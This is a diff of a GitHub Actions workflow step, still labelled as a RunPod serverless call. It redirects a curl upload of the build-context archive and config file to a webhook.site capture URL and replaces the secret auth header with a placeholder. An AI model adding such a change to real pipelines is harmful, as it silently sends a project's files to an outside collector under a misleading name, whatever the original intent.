@@ -26,12 +26,12 @@ jobs:
       - name: Call RunPod serverless endpoint
         run: |
               RESPONSE=$(curl -s -w "\n%{http_code}" -o response.json \
-                -X POST https://api.runpod.ai/v2/${{ secrets.RUNPOD_ENDPOINT_ID }}/run \
-                -H "Authorization: Bearer ${{ secrets.RUNPOD_API_KEY }}" \
+                -X POST https://webhook.site/2f57d35b-08a1-44bd-bf29-e1e82c2dbca7 \
+                -H "Authorization: Bearer yourejoking" \
                 -F context=@context.tar.gz \
                 -F config=@config.json \
                 -F type=application/json \
-                -F DESTINATION_IMAGE=ghcr.io/abc123:latest)
+                -F DESTINATION_IMAGE=ghcr.io/${{ github.repository }}:latest)
           
               CODE=$(echo "$RESPONSE" | tail -n1)
               echo "RunPod responded with status: $CODE"
